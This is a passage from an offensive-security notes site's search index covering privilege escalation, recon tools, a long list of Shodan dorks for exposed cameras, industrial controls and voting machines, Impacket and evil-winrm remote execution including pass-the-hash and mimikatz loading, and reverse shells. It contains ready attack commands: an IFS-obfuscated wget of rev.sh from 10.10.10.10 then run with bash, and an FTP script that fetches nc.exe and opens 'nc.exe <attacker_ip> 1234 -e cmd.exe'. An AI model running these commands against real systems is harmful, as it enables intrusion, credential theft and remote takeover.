/usr/local/bin/suid-env\n</code></pre>"},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#strings-see-what-the-comand-is-doing","title":"strings - see what the comand is doing","text":"<pre><code>strings /usr/local/bin/suid-env\n</code></pre>"},{"location":"Cyber_Offensive/Privilege_Escalation/Linux_Privilege_Escalation/Linux_Privilege_Escalation/#automated-tools","title":"automated tools","text":"<p>LinEnum</p>"},{"location":"Cyber_Offensive/Privilege_Escalation/Windows_Privilege_Escalation/Windows_Privilege_Escalation/","title":"Windows Privilege Escalation","text":""},{"location":"Cyber_Offensive/Privilege_Escalation/Windows_Privilege_Escalation/Windows_Privilege_Escalation/#resources","title":"Resources","text":"<ul> <li>hacktricks</li> <li>Windows Kernel Exploits</li> <li>Privilege Escalation Windows \u00b7 Total OSCP Guide</li> <li>Windows Privilege Escalation Guide</li> <li>PayloadsAllTheThings | Windows Privilege Escalation</li> <li>FuzzySecurity | Windows Privilege Escalation Fundamentals</li> </ul>"},{"location":"Cyber_Offensive/Privilege_Escalation/Windows_Privilege_Escalation/Windows_Privilege_Escalation/#tools","title":"Tools","text":""},{"location":"Cyber_Offensive/Privilege_Escalation/Windows_Privilege_Escalation/Windows_Privilege_Escalation/#windows-secrets","title":"Windows Secrets","text":"<ul> <li>secretsdump.py Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state.</li> <li>mimikatz.py Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi.</li> </ul>"},{"location":"Cyber_Offensive/Privilege_Escalation/Windows_Privilege_Escalation/Windows_Privilege_Escalation/#wmi","title":"WMI","text":"<ul> <li>wmiquery.py It allows to issue WQL queries and get description of WMI objects at the target system (e.g. select name from win32_account).</li> <li>wmipersist.py This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified.</li> </ul>"},{"location":"Cyber_Offensive/Privilege_Escalation/Windows_Privilege_Escalation/Windows_Privilege_Escalation/#commands","title":"Commands","text":""},{"location":"Cyber_Offensive/Privilege_Escalation/Windows_Privilege_Escalation/Windows_Privilege_Escalation/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"Cyber_Offensive/Recon/DNSLookup/","title":"DNSLookup","text":""},{"location":"Cyber_Offensive/Recon/DNSLookup/#dnsdumpster-a-tool-to-perform-dns-mx-ns-lookup","title":"Dnsdumpster a tool to perform DNS, MX, NS Lookup","text":"<ul> <li>dnsdumpster</li> <li>dnsdumpster-readthedocs</li> <li>dnsdumpster-github</li> </ul>"},{"location":"Cyber_Offensive/Recon/DNSLookup/#nslookup","title":"nslookup","text":"<ul> <li>nslookup</li> </ul>"},{"location":"Cyber_Offensive/Recon/DNSLookup/#domain-digger","title":"Domain Digger","text":"<ul> <li>Domain Digger</li> <li>Domain Digger-github</li> </ul>"},{"location":"Cyber_Offensive/Recon/DNSLookup/#dns-record-types-explaination","title":"DNS Record Types Explaination","text":"DNS Record Type Desription A Maps domain names to IPv4 addresses AAAA Maps domain names to IPv6 addresses AFSDB AFS database location APL Address prefix list AXFR Authoritative zone transfer CAA Certification authority authorization CDNSKEY Child copy of a DNSKEY CDS Child copy of DS CERT Cryptographic certificate CNAME Canonical name [Redirects a domain to a different domain] CSYNC Child-to-parent synchronization DHCID DHCP identifier DLV DNSSEC lookaside validation DNAME Delegation name DNSKEY Cryptographic key for DNSSEC [Increases Security through signatures that can be checked to verify that a record came from the correct DNS server] DS Delegation signer [used to verify the authenticity of child zones (subdomains) of DNSSEC zones] EUI48 MAC address (EUI-48) EUI64 Mac address (EUI-64) HINFO Host information HIP Host identification protocol HTTPS HTTPS binding IPSECKEY Cryptographic key for IPsec IXFR Incremental zone transfer KEY Cryptographic key for DNSSEC (obsoleted by DNSKEY) KX Key exchange LOC Geographical location MX Mail exchange [Provides the domain names of mail servers that receive emails on behalf of a domain] NAPTR Naming authority pointer NS Name server [Provides a list of the authoritative name servers responsible for the domain] NSEC3 Next secure (version 3) NSEC3PARAM Parameter for NSEC3 NSEC Next secure (obsoleted by NSEC3) NXT DNSSEC key (obsoleted by NSEC) OPENPGPKEY Public key for OpenPGP OPT EDNS option PTR Canonical name pointer [Resolves IPv4 or IPv6 addresses to domain names] RP Responsible person RRSIG Resource record signature for DNSSEC SIG Resource record signature for DNSSEC (obsoleted by RRSIG) SMIMEA S/MIME association SOA Start of authority [Provides important details about a DNS zone; required for every DNS zone] SPF Sender Policy Framework [lists all the servers authorized to send emails from a particular domain] SSHFP Public key fingerprint for SSH SVCB Service binding SRV Service locator [specifies a host and port for specific services such as VoIP] TA Trust authority for DNSSEC TKEY Transaction key TLSA Certificate association for TLS TSIG Transaction signature TXT Provides any type of descriptive information in text format URI Uniform resource identifier ZONEMD Message digest for DNS zones"},{"location":"Cyber_Offensive/Recon/Dorking/","title":"Dorking","text":"<p>pagodo github</p>"},{"location":"Cyber_Offensive/Recon/Dorking/#apidork","title":"apidork","text":"<p>apidork</p> <pre><code>git clone https://github.com/sameerfakhoury/apidork.git\ncd apidork\npip install -r requirements.txt\npython3 apidork.py\n</code></pre> <p>now you are ready to use the tool and check each option with the corresponding information to use with</p> <p>usage</p> <p>Syntax: python3 apidork.py -option1 \"value1\" -option2 \"value2\" Options to use:</p> <pre><code>1. username search: -u \"user_name\" -- example: python3 apidork.py -u \"example\"                                                              \n2. files related to domain: -d \"domain_name\" -f \"file_extension\" -- example: python3 apidork.py -d \"example.com\" -f \"pdf\"                   \n3. text in website: -url \"full_url\" -t \"keyword\" -- example: python3 apidork.py -url \"https://example.com/index.html\" -t \"helloword\"        \n4. restrict search to domain : -d \"domain_name\" -- example: python3 apidork.py -d \"xxx.xxx.xx\"                                              \n5. links title with keyword: -k \"title_keyword\" -- example: python3 apidork.py -k \"xxxxxxxxxx\"                                            \n6. extract location information: -lat \"latitude\" -lon \"longitude\" -- example: python3 apidork.py -lat \"xx.xxx...\" -lon \"xx.xxx...\"          \n7. extract location coordinates: -l \"location_name\" -- example: python3 apidork.py -l \"xxxx xxx xx ...\"                                     \n8. extract IP informations: -ip \"ip\" -- example: python3 apidork.py -ip \"x.x.x.x\"                                                           \n9. check your public IP: -myip -- example: python3 apidork.py -myip\n10. extract Zip/postal code informations: -c \"country\" -z \"zipcode\" -- example: python3 -c \"xx\" -z \"xxxxx\"                                  \n</code></pre>"},{"location":"Cyber_Offensive/Recon/Dorking/#dorks-eye","title":"Dorks eye","text":"<p>dorks eye - hackingpassion dorks eye - github</p>"},{"location":"Cyber_Offensive/Recon/Dorking/#dorkfinder","title":"DorkFinder","text":"<p>DorkFinder- github</p>"},{"location":"Cyber_Offensive/Recon/Dorking/#install-on-linux","title":"Install on Linux","text":"<pre><code>git clone https://github.com/glavstroy/DorkFinder\ncd DorkFinder\npip install -r requirements\n</code></pre>"},{"location":"Cyber_Offensive/Recon/Dorking/#install-on-docker","title":"Install on Docker","text":"<pre><code>git clone https://github.com/glavstroy/DorkFinder\ncd DorkFinder\nsudo docker build . -t dorkfinder\nsudo docker run -it --rm dorkfinder\n</code></pre>"},{"location":"Cyber_Offensive/Recon/Dorking/#switchesflags","title":"Switches/Flags","text":"Flag Description -h/--help show this help message and exit -t enter the target domain -o print to output.txt"},{"location":"Cyber_Offensive/Recon/Dorking/#usage","title":"Usage","text":"<pre><code>python3 dorkfinder.py -t example.com -o\n</code></pre>"},{"location":"Cyber_Offensive/Recon/recon/","title":"recon","text":"<p>DNSdumpster Shodan.io</p> <pre><code>whois\nping\ntelnet\ntraceroute\nnc\n</code></pre> <p>We can use the favicon link of a website to find the framework used</p> <pre><code>curl https://website.com/favicon.ico | md5sum\n#this calculates md5 hash value after downloading the favicon\n#hash can be used to lookup on &lt;https://wiki.owasp.org/index.php/OWASP_favicon_database&gt;\n</code></pre> <p>Manually discovering HTTP headers</p> <pre><code>curl http://website.com/ -v\n</code></pre> <p>Google dorking</p>"},{"location":"Cyber_Offensive/Recon/shodan.io/","title":"shodan.io","text":""},{"location":"Cyber_Offensive/Recon/shodan.io/#overview","title":"Overview","text":"<p>Although you can access shodan through GUI, you can actually use cli.shodan instead.</p>"},{"location":"Cyber_Offensive/Recon/shodan.io/#shodan-dorks","title":"shodan-dorks","text":"<p>shodan-dorks github</p> Cameras <p>General camera search. <code>camera</code> - 3,663,091 results  </p> <p>Hikvision IP Cameras. <code>product:\"Hikvision IP Camera\"</code> - 2,710,304 results Backdoor exploit at https://ipvm.com/reports/hik-exploit</p> <p>Webcams running on IPCam Client. <code>title:\"IPCam Client\"</code> - 60,012 results  </p> <p>Older webcams running on GeoVision. <code>server: GeoHttpServer</code> - 40,659 results  </p> <p>Avigilion-brand camera/monitoring devices. <code>title:\"Avigilon\"</code> - 18,951 results  </p> <p>Vivotek IP cameras. <code>server: VVTK-HTTP-Server</code> - 15,333 results  </p> <p>DVR CCTV cameras accessible via http. <code>200 ok dvr port:\"81\"</code> - 9,409 results  </p> <p>Netwave-make IP cameras. <code>Netwave IP Camera Content-Length: 2574</code> - 1,313 results  </p> <p>A UK-based IP camera provider. <code>WWW-Authenticate: \"Merit LILIN Ent. Co., Ltd.\"</code> - 1,208 results  </p> <p>Yet another WebCAM software. <code>product:\"Yawcam webcam viewer httpd\"</code> - 613 results  </p> <p>UI3 - the HTML5 web interface for Blue Iris. <code>title:\"ui3 -\"</code> - 496 results  </p> <p>Unsecured Linksys webcams. <code>title:\"+tm01+\"</code> - 447 results  </p> <p>Various IP camera/video management system products. <code>ACTi</code> - 385 results  </p> <p>Webcams with screenshots. <code>webcam has_screenshot:true</code> - 199 results  </p> <p>Webcams running on webcamXP <code>server: webcamxp</code> - 162 results  </p> <p>Webcams running on webcam 7. <code>server: \"webcam 7\"</code> - 89 results  </p> <p>IP Webcams with screenshots. <code>has_screenshot:true IP Webcam</code> - 78 results  </p> <p>Webcams running on Blue Iris. <code>title:\"blue iris remote view\"</code> - 35 results  </p> <p>Canon-manufactured megapixel security cameras. <code>title:\"Network Camera VB-M600\"</code> - 33 results  </p> <p>i-Catcher IP-based CCTV systems. <code>server: \"i-Catcher Console\"</code> - 25 results  </p> <p>Linksys WVC80N cameras. <code>WVC80N</code> - 24 results  </p> Industrial Control Systems <p>EtherNet/IP <code>port:44818</code> - 536,021 results  </p> <p>S7 <code>port:102</code> - 515,940 results  </p> <p>Modbus <code>port:502</code> - 507,869 results  </p> <p>BACnet <code>port:47808</code> - 45,102 results  </p> <p>Niagara Fox <code>port:1911,4911 product:Niagara</code> - 9,257 results  </p> <p>VNC Servers <code>\"authentication disabled\" \"RFB 003.008\"</code> - 6,623 results While not always 100% guaranteed to be a system, lots of embedded systems can show up here, along with personal systems.</p> <p>More VNC Servers <code>\"authentication disabled\" port:5900,5901</code> - 6,321 results Another search term for VNC servers - most are on port 5900 or 5901 as these are VNC display ports.</p> <p>Gas Station Pump Controllers <code>\"in-tank inventory\" port:10001</code> - 5,998 results Find gas station pump controllers with accessible inventory data.</p> <p>IEC 60870-5-104 <code>port:2404 asdu address</code> - 3,488 results  </p> <p>Siemens Industrial Automation <code>\"Siemens, SIMATIC\" port:161</code> - 3,024 results  </p> <p>Omron FINS <code>port:9600 response code</code> - 1,835 results  </p> <p>DICOM Medical X-Ray Machines <code>\"DICOM Server Response\" port:104</code> - 1,818 results  </p> <p>DNP3 <code>port:20000 source address</code> - 1,007 results  </p> <p>PCWorx <code>port:1962 PLC</code> - 980 results  </p> <p>XZERES Wind Turbine <code>title:\"xzeres wind\"</code> - 582 results  </p> <p>ProConOS <code>port:20547 PLC</code> - 500 results  </p> <p>MELSEC-Q <code>port:5006,5007 product:mitsubishi</code> - 255 results  </p> <p>Door / Lock Access Controllers <code>\"HID VertX\" port:4070</code> - 186 results  </p> <p>C4 Max Commercial Vehicle GPS Trackers <code>[1m[35mWelcome on console</code> - 75 results  </p> <p>Electric Vehicle Chargers <code>\"Server: gSOAP/2.8\" \"Content-Length: 583\"</code> - 42 results  </p> <p>Nordex Wind Turbine Farms <code>http.title:\"Nordex Control\" \"Windows 2000 5.0 x86\" \"Jetty/3.1 (JSP 1.1; Servlet 2.2; java 1.6.0_14)\"</code> - 36 results  </p> <p>GaugeTech Electricity Meters <code>\"Server: EIG Embedded Web Server\" \"200 Document follows\"</code> - 33 results  </p> <p>Voting Machines in the United States <code>\"voter system serial\" country:US</code> - 23 results  </p> <p>Traffic Light Controllers / Red Light Cameras <code>mikrotik streetlight</code> - 21 results  </p> <p>Open ATM <code>NCR Port:\"161\"</code> - 21 results  </p> <p>CAREL PlantVisor Refrigeration Units <code>\"Server: CarelDataServer\" \"200 Document follows\"</code> - 13 results  </p> <p>HART-IP <code>port:5094 hart-ip</code> - 12 results  </p> <p>Siemens HVAC Controllers <code>\"Server: Microsoft-WinCE\" \"Content-Length: 12581\"</code> - 6 results  </p> <p>Fuel Pumps connected to internet <code>\"privileged command\" GET</code> - 5 results  </p> <p>Samsung Electronic Billboards <code>Server: Prismview Player</code> - 3 results Search for electronic billboards managed by Prismview servers.</p> <p>Automatic License Plate Readers <code>P372 \"ANPR enabled\"</code> - 2 results  </p> <p>Submarine Mission Control Dashboards <code>title:\"Slocum Fleet Mission Control\"</code> - 1 result  </p> <p>Tesla Powerpack charging Status <code>http.title:\"Tesla PowerPack System\" http.component:\"d3\" -ga3ca4f2</code> - 1 result  </p> Network Infastructure <p>General MySQL Database Search <code>product:MySQL</code> - 3,319,173 results  </p> <p>Remote PostgreSQL Connections <code>port:5432 PostgreSQL</code> - 761,333 results  </p> <p>MongoDB Server Information on Default Port <code>\"MongoDB Server Information\" port:27017</code> - 104,009 results  </p> <p>Default MongoDB Instances <code>mongodb port:27017</code> - 102,910 results  </p> <p>Open Elasticsearch Databases <code>port:\"9200\" all:elastic</code> - 30,464 results  </p> <p>Jenkins CI <code>\"X-Jenkins\" \"Set-Cookie: JSESSIONID\" http.title:\"Dashboard\"</code> - 14,767 results  </p> <p>Cisco Smart Install <code>smart install client active</code> - 7,099 results  </p> <p>Listed Apache CouchDB <code>product:\"CouchDB\"</code> - 4,670 results  </p> <p>Android Root Bridges <code>\"Android Debug Bridge\" \"Device\" port:5555</code> - 4,117 results  </p> <p>Polycom Video Conferencing <code>http.title:\"- Polycom\" \"Server: lighttpd\"</code> - 3,625 results  </p> <p>Pi-hole Open DNS Servers <code>\"dnsmasq-pi-hole\" \"Recursion: enabled\"</code> - 2,960 results  </p> <p>Lantronix Serial-to-Ethernet Adapter Leaking Telnet Passwords <code>Lantronix password port:30718 -secured</code> - 644 results  </p> <p>Already Logged-In as root via Telnet <code>\"root@\" port:23 -login -password -name -Session</code> - 581 results  </p> <p>Accessible Kibana Dashboards <code>kibana content-length:217</code> - 535 results  </p> <p>Exposed MongoDB Express Web Interfaces <code>\"Set-Cookie: mongo-express=\" \"200 OK\"</code> - 395 results  </p> <p>Citrix Virtual Apps <code>\"Citrix Applications:\" port:1604</code> - 300 results  </p> <p>PBX IP Phone Gateways <code>PBX \"gateway console\" -password port:23</code> - 179 results  </p> <p>Docker Private Registries <code>\"Docker-Distribution-Api-Version: registry\" \"200 OK\" -gitlab</code> - 141 results  </p> <p>Telnet Configuration <code>\"Polycom Command Shell\" -failed port:23</code> - 39 results  </p> <p>Weave Scope Dashboards <code>title:\"Weave Scope\" http.favicon.hash:567176827</code> - 13 results  </p> <p>Vulnerable CouchDB Instances <code>port:\"5984\"+Server: \"CouchDB/2.1.0\"</code> - 5 results  </p> Printers <p>General Printer Search <code>printer</code> - 86,286 results  </p> <p>HP Printers Remote Restart <code>port:161 hp</code> - 11,002 results  </p> <p>Canon Printer HTTP Servers <code>Server: CANON HTTP Server</code> - 9,818 results  </p> <p>HTTP Accessible Epson Printers <code>http 200 server epson -upnp</code> - 2,016 results  </p> <p>Samsung Printers with SyncThru Web Service <code>title:\"syncthru web service\"</code> - 998 results  </p> <p>Unsecured Telnet Access to Printers <code>port:23 \"Password is not set\"</code> - 414 results  </p> <p>Remote Access to Xerox Printers <code>ssl:\"Xerox Generic Root\"</code> - 371 results  </p> <p>Epson Printers via HTTP Server <code>\"Server: EPSON-HTTP\" \"200 OK\"</code> - 322 results  </p> <p>HP LaserJet Printers via HTTP <code>\"HP-ChaiSOE\" port:\"80\"</code> - 163 results  </p> <p>Lexmark Printer Control Panels <code>Printer Type: Lexmark</code> - 157 results  </p> <p>Brother Printers Admin Interface <code>\"Location: /main/main.html\" debut</code> - 68 results  </p> <p>Printers with FTP Access <code>Laser Printer FTP Server</code> - 4 results  </p> Files and Directories <p>Open Lists of Files and Directories <code>http.title:\"Index of /\"</code> - 366,845 results  </p> <p>Filezilla FTP <code>filezilla port:\"21\"</code> - 254,717 results  </p> <p>Samba Shares with Authentication Disabled <code>\"Authentication: disabled\" port:445 product:\"Samba\"</code> - 210,681 results  </p> <p>Open Lists on Port 80 <code>port:80 title:\"Index of /\"</code> - 141,689 results  </p> <p>FTP Access Without Credentials <code>\"220\" \"230 Login successful.\" port:21</code> - 62,727 results  </p> <p>Anonymous Access Allowed FTP <code>\"Anonymous access allowed\" port:\"21\"</code> - 32,821 results  </p> <p>NDMP on FTP Port 10000 <code>ftp port:\"10000\"</code> - 6,011 results  </p> <p>Vulnerable vsftpd Service <code>vsftpd 2.3.4</code> - 2,954 results  </p> <p>QuickBooks Files Shared Over Network <code>\"QuickBooks files OverNetwork\" -unix port:445</code> - 42 results  </p> Compromised devices and websites <p>General Hacked Label Search <code>hacked</code> - 1,723 results  </p> <p>Compromised Legacy Systems on Port 4444 <code>port:4444 system32</code> - 1,147 results  </p> <p>Compromised Routers Labeled HACKED-ROUTER <code>HACKED-ROUTER</code> - 762 results  </p> <p>Compromised Routers <code>hacked-router-help-sos</code> - 750 results  </p> <p>Hacked By in HTTP Title <code>http.title:\"Hacked by\"</code> - 519 results  </p> <p>Variation of Hacked By Label Search <code>hacked by</code> - 269 results  </p> <p>Compromised Hosts Advertising Default Password <code>HACKED-ROUTER-HELP-SOS-HAD-DEFAULT-PASSWORD</code> - 102 results  </p> <p>Compromised FTP Servers <code>HACKED FTP server</code> - 68 results  </p> <p>Ransomware Infected RDP Services <code>\"attention\" \"encrypted\" port:3389</code> - 9 results  </p> <p>Owned By Label in HTTP Title <code>http.title:\"0wn3d by\"</code> - 6 results  </p> <p>Bitcoin Ransomware with Screenshot <code>bitcoin has_screenshot:true</code> - 2 results  </p> Miscellaneous <p>General Dashboard Interfaces <code>http.title:\"dashboard\"</code> - 157,047 results  </p> <p>Control Panel Access Points <code>http.title:\"control panel\"</code> - 64,207 results  </p> <p>Minecraft Servers <code>\"Minecraft Server\" \"protocol 340\" port:25565</code> - 10,652 results  </p> <p>Tesla-related Interfaces <code>http.title:\"Tesla\"</code> - 587 results  </p> <p>Everything in North Korea <code>net:175.45.176.0/22,210.52.109.0/24,77.94.35.0/24</code> - 44 results  </p> <p>EIG Electricity Meters <code>\"Server: EIG Embedded Web Server\" \"200 Document follows\"</code> - 33 results  </p> <p>Misconfigured WordPress Installations <code>http.html:\"* The wp-config.php creation script uses this file\"</code> - 10 results  </p> <p>Ethereum Miners <code>ETH - Total speed</code> - 1 result  </p>"},{"location":"Cyber_Offensive/Remote_connection_%26_execution/Remote_connection_%26_execution/","title":"Remote connection & execution","text":""},{"location":"Cyber_Offensive/Remote_connection_%26_execution/Remote_connection_%26_execution/#resources","title":"Resources","text":"<ul> <li>Impacket \u2013 SecureAuth</li> <li>Offensive Security Cheatsheet</li> </ul>"},{"location":"Cyber_Offensive/Remote_connection_%26_execution/atexec.py/","title":"atexec.py","text":"<p>This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</p> <pre><code># This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.\natexec.py domain/user:password@IP &lt;command&gt;\n</code></pre>"},{"location":"Cyber_Offensive/Remote_connection_%26_execution/dcomexec.py/","title":"dcomexec.py","text":"<p>A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects.</p> <pre><code># A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. \n#Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects.\ndcomexec.py domain/user:password@IP &lt;command&gt;\n</code></pre>"},{"location":"Cyber_Offensive/Remote_connection_%26_execution/evil-winrm/","title":"evil-winrm","text":"<pre><code>#install - You must have Ruby installed to use gem\ngem install evil-winrm\n\n#example\nevil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'\n\n#enable SSL\nevil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s\n\n#Login with NTLM Hash -Pass The Hash Attack\nevil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38\n\n#Login with the key using Evil-winrm\nevil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S\n\n#Load Powershell Script - example with mimikatz.ps1\nevil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell\nBypass-4MSI\nInvoke-Mimikatz.ps1\nInvoke-Mimikatz\n\n#Store logs with Evil-winrm\nevil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -l\n\n#Disable Remote Path Completion\nevil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -N\n\n#Disable Coloured Interface\nevil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -n\n\n#Run Executables File\nevil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc\nBypass-4MSI\nmenu\nInvoke-Binary /opt/privsc/winPEASx64.exe\n\n#Service Enumeration with Evil-winrm\nmenu\nservices\n\n#File Transfer with Evil-winrm\nupload /root/notes.txt .\ndownload notes.txt /root/raj/notes.txt\n\n#Use Evil-winrm From Docker\ndocker run --rm -ti --name evil-winrm  oscarakaelvis/evil-winrm -i 192.168.1.105 -u Administrator -p 'Ignite@987'\n</code></pre>"},{"location":"Cyber_Offensive/Remote_connection_%26_execution/psexec.py/","title":"psexec.py","text":"<p>PSEXEC like functionality example using RemComSvc (https://github.com/kavika13/RemCom).</p> <pre><code># PSEXEC like functionality example using RemComSvc(https://github.com/kavika13/RemCom).\npsexec.py domain/user:password@IP &lt;command&gt;\n</code></pre>"},{"location":"Cyber_Offensive/Remote_connection_%26_execution/smbexec.py/","title":"smbexec.py","text":"<p>A similar approach to PSEXEC w/o using RemComSvc. The technique is described\u00a0here. Our implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine does NOT have a writeable share available.</p> <pre><code># smbexec\n# A similar approach to PSEXEC w/o using RemComSvc. The technique is described here. \n# Instantiating a local smbserver to receive the output of the commands. \n# This is useful in the situation where the target machine does NOT have a writeable share available.\nsmbexec.py domain/user:password@IP &lt;command&gt;\n</code></pre>"},{"location":"Cyber_Offensive/Remote_connection_%26_execution/winrm/","title":"winrm","text":"<p>To Enable PSRemoting</p> <pre><code>Enable-PSRemoting -Force\n</code></pre> <p>Adding a trusted host</p> <pre><code>winrm s winrm/config/client '@{TrustedHosts=\"192.5.2.30\"}'\n</code></pre> <p>running commands</p> <pre><code>Invoke-Command -ComputerName WINB -ScriptBlock { echo \"Hello World\"}\n</code></pre>"},{"location":"Cyber_Offensive/Remote_connection_%26_execution/wmiexec.py/","title":"wmiexec.py","text":"<p>A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy.</p> <pre><code>wmiexec.py domain/user:password@IP &lt;command&gt;\n</code></pre>"},{"location":"Cyber_Offensive/Reverse_shell/Reverse_shell/","title":"Reverse shell","text":""},{"location":"Cyber_Offensive/Reverse_shell/Reverse_shell/#sources","title":"sources","text":"<ul> <li>InternalAllTheThings</li> <li>calc1f4r Rootme</li> <li>Reverse Shells</li> <li>Online - Reverse Shell Generator</li> <li>ShutdownRepo/shellerator</li> <li>0x00-0x00/ShellPop</li> <li>cybervaca/ShellReverse</li> <li>pyminifier</li> <li>xct/xc</li> <li>Reverse Shell Generator</li> <li>t0thkr1s/revshellgen</li> <li>mthbernardes/rsg</li> <li>My Pentest Tools</li> </ul>"},{"location":"Cyber_Offensive/Reverse_shell/Reverse_shell/#0dayctf","title":"0dayctf","text":"<p>0dayctf</p> <pre><code>wget https://github.com/0dayCTF/reverse-shell-generator/archive/refs/heads/main.zip\nunzip main.zip\ncd reverse-shell-generator-main\ndocker build -t reverse_shell_generator .\ndocker run -d -p 8090:80 reverse_shell_generator\n\nhttp://127.0.0.1:8090\n</code></pre>"},{"location":"Cyber_Offensive/Reverse_shell/Reverse_shell/#bash-ifs-reverse-shell-burp-repeater-php","title":"Bash IFS - Reverse Shell - Burp Repeater - PHP","text":"<ul> <li>IFS Internal Field Separator</li> <li>The special shell variable\u00a0IFS\u00a0determines how Bash recognizes word boundaries while splitting a sequence of character strings.</li> <li>The default value of\u00a0IFS\u00a0is a three-character string comprising a space, tab, and newline</li> </ul> <pre><code>ls${IFS}-la\nping${IFS}127.0.0.1\nwget${IFS}http://10.10.10.10:8888/rev.sh\nchmod${IFS}777{IFS}rev.sh\nbash${IFS}rev.sh\n</code></pre>"},{"location":"Cyber_Offensive/Services/FTP/","title":"FTP","text":""},{"location":"Cyber_Offensive/Services/FTP/#vsftpd","title":"vsftpd","text":""},{"location":"Cyber_Offensive/Services/FTP/#installing-vsftpd","title":"Installing vsftpd","text":"<pre><code>sudo apt-get install vsftpd\n</code></pre>"},{"location":"Cyber_Offensive/Services/FTP/#update-config-to-writable","title":"Update config to writable","text":"<pre><code>sudo nano /etc/vsftpd.conf\n</code></pre> <p>locate <code>write_enable=YES</code> and remove the <code>#</code> in front of it and save the file changes.</p>"},{"location":"Cyber_Offensive/Services/FTP/#restart-vsftpd","title":"Restart vsftpd","text":"<pre><code>sudo systemctl restart vsftpd\n</code></pre> <p>Now you can FTP and do what you need to do.</p>"},{"location":"Cyber_Offensive/Services/FTP/#purging-vsftpd","title":"purging vsftpd","text":"<pre><code>sudo apt purge vsftpd\n</code></pre>"},{"location":"Cyber_Offensive/Services/FTP/#another-way","title":"another way","text":""},{"location":"Cyber_Offensive/Services/FTP/#set-up-a-ftp-downloading-script-on-the-target-machine","title":"Set up a ftp downloading script on the target machine","text":"<pre><code>echo open IP 21 &gt; ftp.txt\necho USER acknak&gt;&gt; ftp.txt\necho jLQRZy4gyLhmMqz2whTw&gt;&gt; ftp.txt\necho ftp &gt;&gt; ftp.txt\necho bin &gt;&gt; ftp.txt\necho GET wget.exe &gt;&gt; ftp.txt\necho bye &gt;&gt; ftp.txt\n</code></pre>"},{"location":"Cyber_Offensive/Services/FTP/#download-the-prepared-file","title":"Download the prepared file","text":"<pre><code>ftp -v -n -s:ftp.txt\n</code></pre>"},{"location":"Cyber_Offensive/Services/FTP/#start-tftp-server-on-kali","title":"Start tftp server on Kali","text":"<pre><code>aftpd start\n</code></pre>"},{"location":"Cyber_Offensive/Services/FTP/#transfer-files-from-kali-to-windows-from-windows-terminal","title":"Transfer files from Kali to Windows (from windows terminal)","text":"<pre><code>tftp -I IPADDRESS GET nameoffile.exe\n</code></pre>"},{"location":"Cyber_Offensive/Services/FTP/#you-can-have-a-shell-using-this","title":"You can have a shell using this","text":"<pre><code>echo open &lt;attacker_ip&gt; 21&gt; ftp.txt\necho USER offsec&gt;&gt; ftp.txt\necho ftp&gt;&gt; ftp.txt\necho bin &gt;&gt; ftp.txt\necho GET nc.exe &gt;&gt; ftp.txt\necho bye &gt;&gt; ftp.txt\nftp -v -n -s:ftp.txt\nnc.exe &lt;attacker_ip&gt; 1234 -e cmd.exe\n</code></pre>"},{"location":"Cyber_Offensive/Services/IMAP/","title":"IMAP","text":""},{"location":"Cyber_Offensive/Services/IMAP/#summary-and-commands","title":"Summary and Commands","text":"<p>rfc3501</p> <p>IMAP listens to TCP port 143</p> <p>Basic Commands</p> Command Description telnet  143 Connect to the IMAP server using Telnet a login  Authenticate the user a select  Select a mailbox a examine  Examine a mailbox a list \"\" \"*\" List all available mailboxes a fetch  Fetch message attributes a store  Set message flags a search  Search for messages a create  Create a new mailbox a delete  Delete a mailbox a logout Log out of the IMAP server <p>IMAP Operations</p> Operation Description Connect Establish a connection to the IMAP server Authenticate Verify the user\u2019s identity Select Choose a mailbox to work with Examine Inspect the contents of a mailbox List Get a list of available mailboxes Fetch Retrieve message attributes Store Set message flags Search Find messages matching a set of criteria Create Create a new mailbox Delete Remove a mailbox Logout Terminate the session with the server <p>IMAP Flags</p> Flag Description \\Seen The message has been read \\Answered The message has been replied to \\Flagged The message is flagged for special attention \\Deleted The message is marked for deletion \\Draft The message is a draft"},{"location":"Cyber_Offensive/Services/IMAP/#example","title":"Example","text":"<pre><code>telnet 10.10.45.250 110\n\n#Trying 10.10.45.250...\n#Connected to MACHINE_IP.\n#Escape character is '^]'.\n#+OK MACHINE_IP Mail Server POP3 Wed, 15 Sep 2021 11:05:34 +0300 \n</code></pre> <pre><code>USER frank\n#+OK frank\n</code></pre> <pre><code>PASS D2xc9CgD\n#+OK 1 messages (179) octets\n</code></pre> <pre><code>STAT\n#+OK 1 179\n</code></pre> <pre><code>LIST\n\n#+OK 1 messages (179) octets\n#1 179\n</code></pre> <pre><code>.\nRETR 1\n\n#+OK\n</code></pre> <pre><code>From: Mail Server \nTo: Frank \nsubject: 